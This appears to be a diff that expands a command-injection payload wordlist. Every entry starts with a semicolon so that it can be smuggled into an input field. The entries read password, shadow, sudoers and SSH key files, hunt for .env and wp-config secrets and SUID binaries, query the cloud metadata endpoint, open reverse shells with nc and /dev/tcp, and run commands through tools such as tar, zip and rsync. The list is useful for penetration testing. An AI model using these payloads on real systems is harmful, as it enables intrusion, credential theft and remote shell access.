@@ -1,15 +1,97 @@
-;whoami
-;uname -a
-;cat /etc/passwd
-;cat /etc/shadow
-;ls -la /
-;ls /home
-;ps aux
-;netstat -an
-;ifconfig
-;ip addr
-;env
-;printenv
-;find / -name "*.env" 2>/dev/null
-;find / -name "config.php" 2>/dev/null
-;find / -perm -u=s -type f 2>/dev/null
+; cat /etc/passwd
+; cat /etc/shadow
+; cat /etc/hosts
+; cat /etc/hostname
+; cat /etc/fstab
+; cat /etc/resolv.conf
+; cat /etc/crontab
+; cat /etc/group
+; cat /etc/sudoers
+; cat /etc/ssh/sshd_config
+; cat /proc/version
+; cat /proc/cpuinfo
+; cat /proc/meminfo
+; cat /proc/net/arp
+; cat /proc/net/tcp
+; cat /proc/net/udp
+; cat /proc/self/environ
+; cat /proc/self/cmdline
+; cat /proc/self/maps
+; ls /var/www/html
+; ls /var/www
+; ls /home
+; ls /root
+; ls /tmp
+; ls /opt
+; ls /etc
+; ls /usr/local/bin
+; ls /usr/bin
+; find / -name "*.conf" -type f 2>/dev/null
+; find / -name "*.log" -type f 2>/dev/null
+; find / -name "*.bak" -type f 2>/dev/null
+; find / -name "id_rsa" 2>/dev/null
+; find / -name "*.pem" 2>/dev/null
+; find / -name "*.key" 2>/dev/null
+; find / -name "config.php" 2>/dev/null
+; find / -name ".env" 2>/dev/null
+; find / -name "wp-config.php" 2>/dev/null
+; find / -perm -u=s -type f 2>/dev/null
+; find / -perm -4000 2>/dev/null
+; id
+; uid=0(root) 
+; whoami
+; groups
+; uname -a
+; uname -m
+; hostname
+; hostname -f
+; env
+; printenv
+; set
+; history
+; cat ~/.bash_history
+; cat ~/.profile
+; cat ~/.bashrc
+; ps aux
+; ps -ef
+; ps axjf
+; top -b -n 1
+; pstree
+; ifconfig
+; ip addr
+; ip route
+; netstat -an
+; ss -tlnup
+; route -n
+; arp -a
+; nmap -sV localhost 2>/dev/null
+; curl http://localhost/
+; wget -q -O- http://localhost/
+; curl http://169.254.169.254/latest/meta-data/
+; nc -e /bin/bash 127.0.0.1 4444
+; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+; python3 -c 'import os; os.system("id")'
+; ruby -e 'system("id")'
+; perl -e 'system("id")'
+; php -r 'system("id");'
+; awk 'BEGIN {system("id")}'
+; vim -c ':!id' -c ':q!'
+; tar --checkpoint-action exec=id /dev/null 2>/dev/null
+; zip -FF /dev/null -T --unzip-command="id" 2>/dev/null
+; 7z e /dev/null -p"$(id)" 2>/dev/null
+; rsync -e 'sh -c "id"' localhost: 2>/dev/null
+; ssh-keyscan -t rsa localhost 2>/dev/null
+; openssl s_client -connect localhost:443 2>/dev/null < /dev/null
+; mysql -h localhost -u root -e "select 1" 2>/dev/null
+; psql -U postgres -c "select 1" 2>/dev/null
+; redis-cli ping 2>/dev/null
+; mongo --eval "db.adminCommand({listDatabases:1})" 2>/dev/null
+; ls /var/log/
+; tail /var/log/syslog
+; tail /var/log/auth.log
+; tail /var/log/apache2/access.log
+; tail /var/log/nginx/access.log
+; last
+; lastlog
+; w
+; who
